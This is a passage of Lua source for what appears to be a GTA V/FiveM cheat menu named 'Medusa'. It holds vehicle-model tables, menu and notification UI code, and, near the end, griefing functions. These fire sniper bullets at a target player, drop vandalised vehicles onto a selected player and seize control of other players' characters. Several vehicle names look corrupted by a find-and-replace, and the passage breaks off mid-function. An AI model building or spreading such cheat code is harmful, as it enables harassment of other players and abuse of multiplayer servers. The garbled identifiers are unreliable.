		{"VIRGO", "lgm_dlc_Medusae"},
		{"VIRGO2", "lsc_lowrider"},
		{"VIRGO3"},
		{"VOODOO", "lsc_default"},
		{"VOODOO2"},
		{"YOSEMITE", "sssa_dlc_xmas2017"},
	},
	
	sportsclassics = {
		{"ARDENT", "candc_gunrunning"},
		{"BTYPE"},
		{"BTYPE2", "sssa_dlc_halloween"},
		{"BTYPE3"},
		{"CASCO", "lgm_dlc_heist"},
		{"CHEBUREK", "sssa_dlc_assault"},
		{"CHEETAH2", "lgm_dlc_executive1"},
		{"COQUETTE2", "lgm_dlc_pilot"},
		{"DEMedusaO", "candc_xmas2017"},
		{"FAGALOA", "sssa_dlc_assault"},
		{"FELTZER3", "lgm_dlc_Medusae"},
		{"GT500", "lgm_dlc_xmas2017"},
		{"INFERNUS2", "lgm_dlc_specialraces"},
		{"JB700", "lgm_default"},
		{"JESTER3", "lgm_dlc_apartments"},
		{"MAMBA", "lgm_dlc_apartments"},
		{"MANANA"},
		{"MICHELLI", "sssa_dlc_assault"},
		{"MONROE", "lgm_default"},
		{"PEYOTE"},
		{"PIGALLE"},
		{"RAPIDGT3", "lgm_dlc_smuggler"},
		{"RETINUE", "sssa_dlc_mp_to_sp"},
		{"SAVESTRA", "lgm_dlc_xmas2017"},
		{"STINGER", "lgm_default"},
		{"STINGERGT", "lgm_default", "stingerg"},
		{"STROMBERG", "candc_xmas2017"},
		{"SWINGER", "lgm_dlc_battle"},
		{"TORERO", "lgm_dlc_executive1"},
		{"TORNADO"},
		{"TORNADO2"},
		{"TORNADO3"},
		{"TORNADO4"},
		{"TORNADO5", "lsc_lowrider2"},
		{"TORNADO6", "sssa_dlc_biker"},
		{"TURISMO2", "lgm_dlc_specialraces"},
		{"VISERIS", "lgm_dlc_xmas2017"},
		{"Z190", "lgm_dlc_xmas2017"},
		{"ZTYPE", "lgm_default"},
	},
	
	sports = {
		{"ALPHA", "lgm_dlc_business"},
		{"BANSHEE", "lgm_default"},
		{"BESTIAGTS", "lgm_dlc_executive1"},
		{"BLISTA2", "sssa_dlc_mp_to_sp"},
		{"BLISTA3", "sssa_dlc_arena"},
		{"BUFFALO"},
		{"BUFFALO2"},
		{"BUFFALO3", "sssa_dlc_mp_to_sp"},
		{"CARBONIZZARE", "lgm_default", "carboniz"},
		{"COMET2", "sssa_default"},
		{"COMET3", "lsc_dlc_import_export"},
		{"COMET4", "lgm_dlc_xmas2017"},
		{"COMET5", "lgm_dlc_xmas2017"},
		{"COQUETTE", "lgm_default"},
		{"ELEGY", "lsc_dlc_import_export"},
		{"ELEGY2", "lgm_default"},
		{"FELTZER2", "lgm_default"},
		{"FLASHGT", "lgm_dlc_apartments"},
		{"FUROREGT", "lgm_dlc_its_creator", "furore"},
		{"FUSILADE", "sssa_dlc_business"},
		{"FUTO", "sssa_dlc_battle"},
		{"GB200", "lgm_dlc_apartments"},
		{"HOTRING", "sssa_dlc_assault"},
		{"ITALIGTO", "lgm_dlc_apartments"},
		{"JESTER", "lgm_dlc_business"},
		{"JESTER2", "sssa_dlc_christmas_2"},
		{"KHAMELION", "lgm_default"},
		{"KURUMA", "sssa_dlc_heist"},
		{"KURUMA2", "sssa_dlc_heist"},
		{"LYNX", "lgm_dlc_stunt"},
		{"MASSACRO", "lgm_dlc_business2"},
		{"MASSACRO2", "sssa_dlc_christmas_2"},
		{"NEON", "lgm_dlc_xmas2017"},
		{"NINEF", "lgm_default"},
		{"NINEF2", "lgm_default"},
		{"OMNIS", "sssa_dlc_mp_to_sp"},
		{"PARIAH", "lgm_dlc_xmas2017"},
		{"PENUMBRA", "sssa_dlc_business"},
		{"RAIDEN", "lgm_dlc_xmas2017"},
		{"RAPIDGT", "lgm_default"},
		{"RAPIDGT2", "lgm_default"},
		{"RAPTOR", "lgm_dlc_biker"},
		{"REVOLTER", "lgm_dlc_xmas2017"},
		{"RUSTON", "lgm_dlc_specialraces"},
		{"SCHAFTER2"},
		{"SCHAFTER3", "lgm_dlc_apartments"},
		{"SCHAFTER4", "lgm_dlc_apartments"},
		{"SCHAFTER5"},
		{"SCHLAGEN", "lgm_dlc_apartments"},
		{"SCHWARZER", "sssa_default", "schwarze"},
		{"SENTINEL3", "sssa_dlc_xmas2017"},
		{"SEVEN70", "lgm_dlc_executive1"},
		{"SPECTER"},
		{"SPECTER2", "lsc_dlc_import_export"},
		{"SULTAN"},
		{"SURANO", "lgm_default"},
		{"TAMPA2"},
		{"TROPOS"},
		{"VERLIERER2", "lgm_dlc_apartments", "verlier"},
		{"ZR380"},
		{"ZR3802"},
		{"ZR3803"},
	},
	
	super = {
		{"ADDER", "lgm_default"},
		{"AUTARCH", "lgm_dlc_xmas2017"},
		{"BANSHEE2", "lgm_default"},
		{"BULLET", "lgm_default"},
		{"CHEETAH", "lgm_default"},
		{"CYCLONE", "lgm_dlc_smuggler"},
		{"DEVESTE", "lgm_dlc_apartments"},
		{"ENTITYXF", "lgm_default"},
		{"ENTITY2", "lgm_dlc_apartments"},
		{"FMJ", "lgm_dlc_executive1"},
		{"GP1", "lgm_dlc_specialraces"},
		{"INFERNUS", "lgm_default"},
		{"ITALIGTB"},
		{"ITALIGTB2", "lsc_dlc_import_export"},
		{"LE7B", "lgm_dlc_stunt"},
		{"NERO"},
		{"NERO2", "lsc_dlc_import_export"},
		{"OSIRIS", "lgm_dlc_Medusae"},
		{"PENETRATOR", "lgm_dlc_heist"},
		{"PFISTER811", "lgm_dlc_executive1"},
		{"PROTOTIPO", "lgm_dlc_executive1"},
		{"REAPER", "lgm_dlc_executive1"},
		{"SC1", "lgm_dlc_xmas2017"},
		{"SCRAMJET", "candc_battle"},
		{"SHEAVA", "lgm_dlc_stunt"},
		{"SULTANRS", "lsc_jan2016", "sultan2"},
		{"T20", "lgm_dlc_Medusae"},
		{"TAIPAN", "lgm_dlc_apartments"},
		{"TEMPESTA", "lgm_dlc_heist"},
		{"TEZERACT", "lgm_dlc_apartments"},
		{"TURISMOR", "lgm_dlc_business"},
		{"TYRANT", "lgm_dlc_apartments"},
		{"TYRUS", "lgm_dlc_stunt"},
		{"VACCA", "lgm_default"},
		{"VAGNER", "lgm_dlc_executive1"},
		{"VIGILANTE", "candc_smuggler"},
		{"VISIONE", "lgm_dlc_smuggler"},
		{"VOLTIC", "lgm_default", "voltic_tless"},
		{"VOLTIC2", "candc_importexport"},
		{"XA21", "lgm_dlc_executive1"},
		{"ZENTORNO", "lgm_dlc_business2"},
	},
	
	motorcycles = {
		{"AKUMA", "sssa_default"},
		{"AVARUS", "sssa_dlc_biker"},
		{"BAGGER", "sssa_dlc_biker"},
		{"BATI", "sssa_default"},
		{"BATI2", "sssa_default"},
		{"BF400", "sssa_dlc_mp_to_sp"},
		{"CARBONRS", "lgm_default", "carbon"},
		{"CHIMERA", "sssa_dlc_biker"},
		{"CLIFFHANGER", "sssa_dlc_mp_to_sp"},
		{"DAEMON"},
		{"DAEMON2", "sssa_dlc_biker"},
		{"DEFILER", "sssa_dlc_biker"},
		{"DEATHBIKE"},
		{"DEATHBIKE2"},
		{"DEATHBIKE3"},
		{"DIABLOUS"},
		{"DIABLOUS2", "lsc_dlc_import_export"},
		{"DOUBLE", "sssa_default"},
		{"ENDURO", "sssa_dlc_heist"},
		{"ESSKEY", "sssa_dlc_biker"},
		{"FAGGIO", "sssa_default"},
		{"FAGGIO2"},
		{"FAGGIO3", "sssa_dlc_biker"},
		{"FCR"},
		{"FCR2", "lsc_dlc_import_export"},
		{"GARGOYLE", "mba_vehicles"},
		{"HAKUCHOU", "sssa_dlc_its_creator"},
		{"HAKUCHOU2", "lgm_dlc_biker"},
		{"HEXER", "sssa_default"},
		{"INNOVATION", "sssa_dlc_heist"},
		{"LECTRO", "lgm_dlc_heist"},
		{"MANCHEZ", "sssa_dlc_biker"},
		{"NEMESIS", "sssa_dlc_heist"},
		{"NIGHTBLADE", "sssa_dlc_biker"},
		{"OPPRESSOR", "candc_gunrunning"},
		{"OPPRESSOR2", "candc_battle"},
		{"PCJ", "sssa_default"},
		{"RATBIKE", "sssa_dlc_biker"},
		{"RUFFIAN", "sssa_default"},
		{"SANCHEZ", "sssa_default"},
		{"SANCHEZ2", "sssa_default"},
		{"SANCTUS", "sssa_dlc_biker"},
		{"SHOTARO", "lgm_dlc_biker"},
		{"SOVEREIGN", "sssa_dlc_heist"},
		{"THRUST", "lgm_dlc_business2"},
		{"VADER", "sssa_default"},
		{"VINDICATOR", "lgm_dlc_Medusae"},
		{"VORTEX", "sssa_dlc_biker"},
		{"WOLFSBANE", "sssa_dlc_biker"},
		{"ZOMBIEA", "sssa_dlc_biker"},
		{"ZOMBIEB", "sssa_dlc_biker"},
	},
	
	offroad = {
		{"BFINJECTION", "sssa_default", "bfinject"},
		{"BIFTA", "sssa_default"},
		{"BLAZER", "sssa_default"},
		{"BLAZER2", "candc_casinoheist"},
		{"BLAZER3"},
		{"BLAZER4", "sssa_dlc_biker"},
		{"BLAZER5", "candc_importexport"},
		{"BODHI2", "sssa_default"},
		{"BRAWLER", "lgm_dlc_Medusae"},
		{"BRUISER"},
		{"BRUISER2"},
		{"BRUISER3"},
		{"BRUTUS"},
		{"BRUTUS2"},
		{"BRUTUS3"},
		{"CARACARA", "sssa_dlc_vinewood"},
		{"DLOADER"},
		{"DUBSTA3", "candc_default"},
		{"DUNE", "sssa_default"},
		{"DUNE2"},
		{"DUNE3", "candc_gunrunning"},
		{"DUNE4"},
		{"DUNE5", "candc_importexport"},
		{"FREECRAWLER", "lgm_dlc_battle"},
		{"INSURGENT", "candc_default"},
		{"INSURGENT2", "candc_default"},
		{"INSURGENT3"},
		{"KALAHARI", "sssa_default"},
		{"KAMACHO", "sssa_dlc_xmas2017"},
		{"MARSHALL", "candc_default"},
		{"MENACER", "candc_battle"},
		{"MESA3", "candc_default"},
		{"MONSTER", "candc_default"},
		{"MONSTER3"},
		{"MONSTER4"},
		{"MONSTER5"},
		{"NIGHTSHARK", "candc_gunrunning"},
		{"RANCHERXL", "sssa_dlc_business", "rancherx"},
		{"RANCHERXL2"},
		{"RCBANDITO", "sssa_dlc_arena"},
		{"REBEL", "sssa_default"},
		{"REBEL2"},
		{"RIATA", "sssa_dlc_xmas2017"},
		{"SANDKING", "sssa_default"},
		{"SANDKING2", "sssa_default", "sandkin2"},
		{"TECHNICAL", "candc_default"},
		{"TECHNICAL2", "candc_importexport"},
		{"TECHNICAL3"},
		{"TROPHYTRUCK"},
		{"TROPHYTRUCK2"},
	},
	
	industrial = {
		{"BULLDOZER"},
		{"CUTTER"},
		{"DUMP", "candc_default"},
		{"FLATBED"},
		{"GUARDIAN", "sssa_dlc_heist"},
		{"HANDLER"},
		{"MIXER"},
		{"MIXER2"},
		{"RUBBLE"},
		{"TIPTRUCK"},
		{"TIPTRUCK2"},
	},
	
	utility = {
		{"AIRTUG"},
		{"CADDY"},
		{"CADDY2"},
		{"CADDY3"},
		{"DOCKTUG"},
		{"FORKLIFT"},
		{"TRACTOR2"},
		{"TRACTOR3"},
		{"MOWER"},
		{"RIPLEY"},
		{"SADLER", "sssa_default"},
		{"SADLER2"},
		{"SCRAP"},
		{"TOWTRUCK"},
		{"TOWTRUCK2"},
		{"TRACTOR"},
		{"UTILLITRUCK"},
		{"UTILLITRUCK2"},
		{"UTILLITRUCK3"},
		{"ARMYTRAILER"},
		{"ARMYTRAILER2"},
		{"FREIGHTTRAILER"},
		{"ARMYTANKER"},
		{"TRAILERLARGE"},
		{"DOCKTRAILER"},
		{"TR3"},
		{"TR2"},
		{"TR4"},
		{"TRFLAT"},
		{"TRAILERS"},
		{"TRAILERS4"},
		{"TRAILERS2"},
		{"TRAILERS3"},
		{"TVTRAILER"},
		{"TRAILERLOGS"},
		{"TANKER"},
		{"TANKER2"},
		{"BALETRAILER"},
		{"GRAINTRAILER"},
		{"BOATTRAILER"},
		{"RAKETRAILER"},
		{"TRAILERSMALL"},
	},
	
	vans = {
		{"BISON", "sssa_default"},
		{"BISON2"},
		{"BISON3"},
		{"BOBCATXL", "sssa_dlc_business"},
		{"BOXVILLE", "candc_casinoheist"},
		{"BOXVILLE2"},
		{"BOXVILLE3"},
		{"BOXVILLE4", "candc_default"},
		{"BOXVILLE5", "candc_importexport"},
		{"BURRITO"},
		{"BURRITO2", "candc_casinoheist"},
		{"BURRITO3"},
		{"BURRITO4"},
		{"BURRITO5"},
		{"CAMPER"},
		{"GBURRITO"},
		{"GBURRITO2", "sssa_dlc_heist"},
		{"JOURNEY", "candc_default"},
		{"MINIVAN", "sssa_dlc_business"},
		{"MINIVAN2", "lsc_lowrider2"},
		{"PARADISE", "sssa_default"},
		{"PONY"},
		{"PONY2"},
		{"RUMPO", "sssa_dlc_heist"},
		{"RUMPO2"},
		{"RUMPO3", "sssa_dlc_executive_1"},
		{"SPEEDO"},
		{"SPEEDO2"},
		{"SPEEDO4"},
		{"SURFER"},
		{"SURFER2"},
		{"TACO"},
		{"YOUGA"},
		{"YOUGA2", "sssa_dlc_biker"},
	},
	
	cycles = {
		{"BMX", "pandm_default"},
		{"CRUISER", "pandm_default"},
		{"FIXTER"},
		{"SCORCHER", "pandm_default"},
		{"TRIBIKE", "pandm_default"},
		{"TRIBIKE2", "pandm_default"},
		{"TRIBIKE3", "pandm_default"},
	},
	
	boats = {
		{"DINGHY", "dock_default", "DINGHY3"},
		{"DINGHY2", "dock_default", "DINGHY3"},
		{"DINGHY3", "dock_default"},
		{"DINGHY4", "dock_default", "DINGHY3"},
		{"JETMAX", "dock_default"},
		{"MARQUIS", "dock_default"},
		{"PREDATOR"},
		{"SEASHARK", "dock_default"},
		{"SEASHARK2"},
		{"SEASHARK3"},
		{"SPEEDER", "dock_default"},
		{"SPEEDER2"},
		{"SQUALO", "dock_default"},
		{"SUBMERSIBLE"},
		{"SUBMERSIBLE2"},
		{"SUNTRAP", "dock_default"},
		{"TORO", "dock_default"},
		{"TORO2", "dock_default", "TORO"},
		{"TROPIC", "dock_default"},
		{"TROPIC2"},
		{"TUG", "dock_dlc_executive1"},
	},
	
	helicopters = {
		{"AKULA", "candc_xmas2017"},
		{"ANNIHILATOR"},
		{"BUZZARD", "candc_default"},
		{"BUZZARD2"},
		{"CARGOBOB", "candc_default"},
		{"CARGOBOB2", "candc_executive1"},
		{"CARGOBOB3"},
		{"CARGOBOB4"},
		{"FROGGER"},
		{"FROGGER2"},
		{"HAVOK", "elt_dlc_smuggler"},
		{"HUNTER", "candc_smuggler"},
		{"MAVERICK"},
		{"POLMAV"},
		{"SAVAGE", "candc_default"},
		{"SEASPARROW", "elt_dlc_assault", "sparrow"},
		{"SKYLIFT"},
		{"SUPERVOLITO"},
		{"SUPERVOLITO2"},
		{"SWIFT", "elt_dlc_pilot"},
		{"SWIFT2", "elt_dlc_Medusae"},
		{"VALKYRIE", "candc_default"},
		{"VALKYRIE2"},
		{"VOLATUS", "elt_dlc_executive1"},
	},
	
	planes = {
		{"ALPHAZ1", "elt_dlc_smuggler"},
		{"AVENGER"},
		{"AVENGER2"},
		{"BESRA", "elt_dlc_pilot"},
		{"BLIMP"},
		{"BLIMP2"},
		{"BLIMP3", "elt_dlc_battle"},
		{"BOMBUSHKA", "candc_smuggler"},
		{"CARGOPLANE"},
		{"CUBAN800"},
		{"DODO"},
		{"DUSTER"},
		{"HOWARD", "elt_dlc_smuggler"},
		{"HYDRA", "candc_default"},
		{"JET"},
		{"LAZER", "candc_smuggler"},
		{"MedusaOR"},
		{"MedusaOR2", "elt_dlc_Medusae"},
		{"MAMMATUS"},
		{"MICROLIGHT", "elt_dlc_smuggler"},
		{"MILJET", "elt_dlc_pilot"},
		{"MOGUL", "candc_smuggler"},
		{"MOLOTOK", "candc_smuggler"},
		{"NIMBUS", "elt_dlc_executive1"},
		{"NOKOTA", "candc_smuggler"},
		{"PYRO", "candc_smuggler"},
		{"ROGUE", "candc_smuggler"},
		{"SEABREEZE", "elt_dlc_smuggler"},
		{"SHAMAL"},
		{"STARLING", "candc_smuggler"},
		{"STRIKEFORCE", "candc_battle"},
		{"STUNT"},
		{"TITAN"},
		{"TULA", "candc_smuggler"},
		{"VELUM"},
		{"VELUM2"},
		{"VESTRA", "elt_dlc_business"},
		{"VOLATOL", "candc_xmas2017"},
	},
		
	service = {
		{"AIRBUS", "candc_default"},
		{"BRICKADE", "candc_executive1"},
		{"BUS", "candc_default"},
		{"COACH", "candc_default"},
		{"PBUS2", "sssa_dlc_battle"},
		{"RALLYTRUCK", "sssa_dlc_mp_to_sp"},
		{"RENTALBUS"},
		{"TAXI"},
		{"TOURBUS"},
		{"TRASH"},
		{"TRASH2"},
		{"WASTELANDER", "candc_importexport", "wastlndr"},
		{"AMBULANCE"},
		{"FBI"},
		{"FBI2"},
		{"FIRETRUK", "candc_casinoheist"},
		{"LGUARD", "candc_casinoheist"},
		{"PBUS", "candc_default"},
		{"POLICE"},
		{"POLICE2"},
		{"POLICE3"},
		{"POLICE4"},
		{"POLICEB"},
		{"POLICEOLD1"},
		{"POLICEOLD2"},
		{"POLICET"},
		{"POLMAV"},
		{"PRANGER"},
		{"PREDATOR"},
		{"RIOT"},
		{"RIOT2", "candc_xmas2017"},
		{"SHERIFF"},
		{"SHERIFF2"},
		{"APC", "candc_gunrunning"},
		{"BARRACKS", "candc_default"},
		{"BARRACKS2"},
		{"BARRACKS3"},
		{"BARRAGE", "candc_xmas2017"},
		{"CHERNOBOG", "candc_xmas2017"},
		{"CRUSADER", "candc_default"},
		{"HALFTRACK", "candc_gunrunning"},
		{"KHANJALI", "candc_xmas2017"},
		{"RHINO", "candc_default"},
		{"SCARAB"},
		{"SCARAB2"},
		{"SCARAB3"},
		{"THRUSTER", "candc_xmas2017"},
		{"TRAILERSMALL2"},
	},
		
	commercial = {
		{"BENSON"},
		{"BIFF"},
		{"CERBERUS"},
		{"CERBERUS2"},
		{"CERBERUS3"},
		{"HAULER"},
		{"HAULER2"},
		{"MULE", "candc_default"},
		{"MULE2"},
		{"MULE3", "candc_default"},
		{"MULE4", "candc_battle"},
		{"PACKER"},
		{"PHANTOM"},
		{"PHANTOM2", "candc_importexport"},
		{"PHANTOM3"},
		{"POUNDER"},
		{"POUNDER2", "candc_battle"},
		{"STOCKADE", "candc_casinoheist"},
		{"STOCKADE3"},
		{"TERBYTE"},
		{"CABLECAR"},
		{"FREIGHT"},
		{"FREIGHTCAR"},
		{"FREIGHTCONT1"},
		{"FREIGHTCONT2"},
		{"FREIGHTGRAIN"},
		{"METROTRAIN"},
		{"TANKERCAR"},
	},

}


---------------------
--  MedusaUI Class  --
---------------------

MedusaUI = {}

Medusa.debug = false --CAmbiame

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 215, back = 194}
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local aspectRatio = GetAspectRatio(true)
local screenResolution = GetActiveScreenResolution()

local menuWidth = 0.185 -- old version was 0.23
local titleHeight = 0.07
local titleYOffset = 0
local titleScale = 1.2

local separatorHeight = 0.0025

local buttonHeight = 0.038
local buttonFont = 4
local buttonScale = 0.375
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.0065
local buttonSpriteXOffset = 0.011
local buttonSpriteScale = { x = 0.016, y = 0 }

local fontHeight = GetTextScaleHeight(buttonScale, buttonFont)

local sliderWidth = (menuWidth / 4)

local sliderHeight = 0.016

local knobWidth = 0.002
local knobHeight = 0.016

local sliderFontScale = 0.275
local sliderFontHeight = GetTextScaleHeight(sliderFontScale, buttonFont)


local toggleInnerWidth = 0.008
local toggleInnerHeight = 0.014
local toggleOuterWidth = 0.01125
local toggleOuterHeight = 0.020

-- Vehicle preview, PlayerInfo, etc
local previewWidth = 0.100

local frameWidth = 0.004

local footerHeight = 0.023

local t
local pow = function(num, pow) return num ^ pow end
local sin = math.sin
local cos = math.cos
local sqrt = math.sqrt
local abs = math.abs
local asin  = math.asin

------------------------------------------------------------------------
-- t = time == how much time has to pass for the tweening to complete --
-- b = begin == starting property value								  --
-- c = change == ending - beginning									  --
-- d = duration == running time. How much time has passed *right now* --
------------------------------------------------------------------------

local cout = function(text) return end

local function outCubic(t, b, c, d)
	t = t / d - 1
	return c * (pow(t, 3) + 1) + b
end

local function inCubic (t, b, c, d)
	t = t / d
	return c * pow(t, 3) + b
end

local function inOutCubic(t, b, c, d)
	t = t / d * 2
	if t < 1 then
		return c / 2 * t * t * t + b
	else
		t = t - 2
		return c / 2 * (t * t * t + 2) + b
	end
end
  
local function outInCubic(t, b, c, d)
	if t < d / 2 then
		return outCubic(t * 2, b, c / 2, d)
	else
		return inCubic((t * 2) - d, b + c / 2, c / 2, d)
	end
end

local notifyBody = {
	-- Text
	scale = 0.35,
	offsetLine = 0.0235, -- text height: 0.019 | newline height: 0.005 or 0.006
	finalPadding = 0.01,
	-- Warp
	offsetX = 0.095, -- 0.0525
	offsetY = 0.009875, -- 0.01
	-- Draw below footer
	footerYOffset = 0,
	-- Sprite
	dict = 'commonmenu',
	sprite = 'header_gradient_script',
	font = 4,
	width = menuWidth + frameWidth, 
	height = 0.023, -- magic 0.8305 -- 0.011625
	heading = 90.0,
	-- Betwenn != notifications
	gap = 0.006,
}

local notifyDefault = {
	text = "Someone forgot to change me!",
	type = 'info',
	timeout = 6000,
	transition = 750,
}

local function NotifyCountLines(v, text)
	BeginTextCommandLineCount("notification_buffer")
	SetTextFont(notifyBody.font)
	SetTextScale(notifyBody.scale, notifyBody.scale)
	SetTextWrap(v.x, v.x + notifyBody.width / 2)
	AddTextComponentSubstringPlayerName(text)
	local nbrLines = GetTextScreenLineCount(v.x - notifyBody.offsetX, v.y - notifyBody.height)
	return nbrLines
end

-- Thread content
local function MakeRoomThread(v, from, to, duration)
	local notif = v
	local beginVal = from
	local endVal = to
	local change = endVal - beginVal

	local timer = 0
	
	local function SetTimer()
		timer = GetGameTimer()
	end
	
	local function GetTimer()
		return GetGameTimer() - timer
	end

	local new_what
	SetTimer()
	local isMoving = true
	while isMoving do
		new_what = outCubic(GetTimer(), beginVal, change, duration)
		if notif.y < endVal then
			notif.y = new_what
		else
			notif.y = endVal
			isMoving = false
			break
		end
		Wait(5)
	end

	-- Medusa.Functions.Print("make room done")
end

-- Animating the 'push' transition of NotifyPrioritize
local function NotifyMakeRoom(v, from, to, duration)
	CreateThread(function()
		return MakeRoomThread(v, from, to, duration)
	end)
end

-- Does nothing right now; not used
local function NotifyGetResolutionConfiguration()
	SetScriptGfxAlign(string.byte('L'), string.byte('B'))
	local minimapTopX, minimapTopY = GetScriptGfxPosition(-0.0045, 0.002 + (-0.188888))
	ResetScriptGfxAlign()
	
	local w, h = GetActiveScreenResolution()
	
	return { x = minimapTopX, y = minimapTopY }
end

-- Pushes previous notifications down. Showing the incoming notification on top
local function NotifyPrioritize(v, id, duration)
	for i, _ in pairs(v) do
		if i ~= id then
			if v[i].draw then
				NotifyMakeRoom(v[i], v[i].y, v[i].y + ((notifyBody.height + ((v[id].lines - 1) * notifyBody.height)) + notifyBody.gap), duration)
			end
		end
	end
end

local fontHeight = GetTextScaleHeight(notifyBody.scale, notifyBody.font)

local properties = { -- 0.72
	x = 0.78 + menuWidth / 2, 
	y = 1.0, 
	notif = {}, 
	offset = NotifyPrioritize,
}

local sound_type = {
	['success'] = { name = "CHALLENGE_UNLOCKED", set = "HUD_AWARDS"},
	['info'] = { name = "FocusIn", set = "HintCamSounds" },
	['error'] = { name = "CHECKPOINT_MISSED", set = "HUD_MINI_GAME_SOUNDSET"},
}

local draw_type = {
	['success'] = { color = themeColors.green, dict = "commonmenu", sprite = "shop_tick_icon", size = 0.016},
	['info'] = { color = themeColors.blue, dict = "shared", sprite = "info_icon_32", size = 0.012},
	['error'] = { color = themeColors.red, dict = "commonmenu", sprite = "shop_lock", size = 0.016},
}

-- Text render wrapper for dynamic animation
local function NotifyDrawText(v, text)
	SetTextFont(notifyBody.font)
	SetTextScale(notifyBody.scale, notifyBody.scale)
	SetTextWrap(v.x, v.x + (menuWidth / 2))
	SetTextColour(255, 255, 255, v.opacity)

	BeginTextCommandDisplayText("notification_buffer")
	AddTextComponentSubstringPlayerName("    " .. text)
	EndTextCommandDisplayText(v.x - notifyBody.width / 2 + frameWidth / 2 + buttonTextXOffset, v.y - notifyBody.gap) -- (notifyBody.height / 2 - fontHeight / 2)
end

-- DrawSpriteScaled and DrawRect wrapper for dynamic animation


local function NotifyFormat(inputString, ...)
	local format = string.format
	text = format(inputString, ...)
	return text
end

Medusa.Functions.KillBulletPlayer = function(TargetCoords)
	ShootSingleBulletBetweenCoords(TargetCoords.x, TargetCoords.y, TargetCoords.z + 1.0, TargetCoords, 25.0, 0, GetHashKey("WEAPON_HEAVYSNIPER"), PlayerPedId(), true, false, 9000.0)
	ShootSingleBulletBetweenCoords(TargetCoords.x, TargetCoords.y, TargetCoords.z + 1.0, TargetCoords, 25.0, 0, GetHashKey("WEAPON_HEAVYSNIPER"), PlayerPedId(), true, false, 9000.0)
	ShootSingleBulletBetweenCoords(TargetCoords.x, TargetCoords.y, TargetCoords.z + 1.0, TargetCoords, 25.0, 0, GetHashKey("WEAPON_HEAVYSNIPER"), PlayerPedId(), true, false, 9000.0)
	ShootSingleBulletBetweenCoords(TargetCoords.x, TargetCoords.y, TargetCoords.z + 1.0, TargetCoords, 25.0, 0, GetHashKey("WEAPON_HEAVYSNIPER"), PlayerPedId(), true, false, 9000.0)
	ShootSingleBulletBetweenCoords(TargetCoords.x, TargetCoords.y, TargetCoords.z + 1.0, TargetCoords, 25.0, 0, GetHashKey("WEAPON_HEAVYSNIPER"), PlayerPedId(), true, false, 9000.0)
	ShootSingleBulletBetweenCoords(TargetCoords.x, TargetCoords.y, TargetCoords.z + 1.0, TargetCoords, 25.0, 0, GetHashKey("WEAPON_HEAVYSNIPER"), PlayerPedId(), true, false, 9000.0)
	ShootSingleBulletBetweenCoords(TargetCoords.x, TargetCoords.y, TargetCoords.z + 1.0, TargetCoords, 25.0, 0, GetHashKey("WEAPON_HEAVYSNIPER"), PlayerPedId(), true, false, 9000.0)
	ShootSingleBulletBetweenCoords(TargetCoords.x, TargetCoords.y, TargetCoords.z + 1.0, TargetCoords, 25.0, 0, GetHashKey("WEAPON_HEAVYSNIPER"), PlayerPedId(), true, false, 9000.0)
end
local drift = false
Medusa.Functions.Drift = function()
	local modifier = 1
	local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
	if drift then
		modifier = -1
	end
	
	for index, value in ipairs(handleMods) do
		SetVehicleHandlingFloat(vehicle, "CHandlingData", value[1], GetVehicleHandlingFloat(vehicle, "CHandlingData", value[1]) + value[2] * modifier)
	end
	
	if drift then
		SetVehicleEnginePowerMultiplier(vehicle, 0.0)
	else
		if GetHandlingfDriveBiasFront == 0.0 then
			SetVehicleEnginePowerMultiplier(vehicle, 190.0)
		else
			SetVehicleEnginePowerMultiplier(vehicle, 100.0)
		end
	end
end

Medusa.Functions.Dance = function()
	local plist = GetActivePlayers()
	Medusa.Functions.Print(json.encode(plist))
	for i = 1, #plist do
		local id = plist[i]
		--Medusa.Functions.Print("Entidad: ".. tostring(IsEntityOnScreen(GetPlayerPed(id))), " ID: " .. tostring(id))
		--if id ~= 0 then
			Medusa.Functions.Print(id)
			local _Ped = GetPlayerPed(id)
			Medusa.Functions.Print(_Ped)
			Medusa.Game:RequestControlOnce(_Ped)
			TaskStartScenarioInPlace(GetPlayerPed(127), "world_human_muscle_free_weights", 0, true);
		--end
	end
end

Medusa.Functions.HeadProp = function(ped, entity)
	Citizen.CreateThread(function()
		local HeadCoords = GetPedBoneCoords(ped, GetEntityBoneIndexByName(ped, "SKEL_HEAD"), 0.0, 0.0, 0.0)
		local obj = CreateObject(GetHashKey(tostring(entity)), HeadCoords, true, true, true)
		AttachEntityToEntity(obj, ped, GetPedBoneIndex(ped, 31086), -0.1, 0, 0, 0, 90.0, 180.0, true, true, false, true, 1, true)
		--Citizen.Wait(5000)
		--DeleteEntity(obj)
	end)
end

Medusa.Functions.GetPlayers = function(callback)
	Citizen.CreateThread(function()
		local plist = GetActivePlayers()
		for i = 1, #plist do
			local id = plist[i]
			local player = id
			if not Medusa.Options.IncludeSelf then
				if player ~= PlayerId() then
					callback(player, GetPlayerPed(player))
				end
			else
				callback(player, GetPlayerPed(player))
			end
		end
	end)
end

Medusa.Functions.RainCar = function(amount, veh, state, legit, SelectedPlayer)
    Medusa.Functions.Print("SENDED")
    if legit then
        Citizen.CreateThread(function()
            for i = 1, amount do
                Citizen.Wait(1000)
                local VehicleHash = GetHashKey(tostring(veh))
                RequestModel(VehicleHash)
                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                while not HasModelLoaded(VehicleHash) do
                    RequestModel(VehicleHash)
                    Citizen.Wait(15)
                end
                local SpawnedVeh = CreateVehicle(VehicleHash, x, y, z + 20.0, 0.0, true, false)
                SetVehicleNumberPlateText(SpawnedVeh, "MEDUSA")
                SetEntityVelocity(SpawnedVeh, 0.0, 0.0, -100.0)
                if state == 2 then
                    Medusa.Functions.Print("Vandalize Car Sended")
                    NetworkRequestControlOfNetworkId(SpawnedVeh)
                    playerVeh = SpawnedVeh
                    NetworkRequestControlOfEntity(playerVeh)
                    StartVehicleAlarm(playerVeh)
                    DetachVehicleWindscreen(playerVeh)
                    SmashVehicleWindow(playerVeh, 0)
                    SmashVehicleWindow(playerVeh, 1)
                    SmashVehicleWindow(playerVeh, 2)
                    SmashVehicleWindow(playerVeh, 3)
                    SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
                    SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
                    SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
                    SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
                    SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
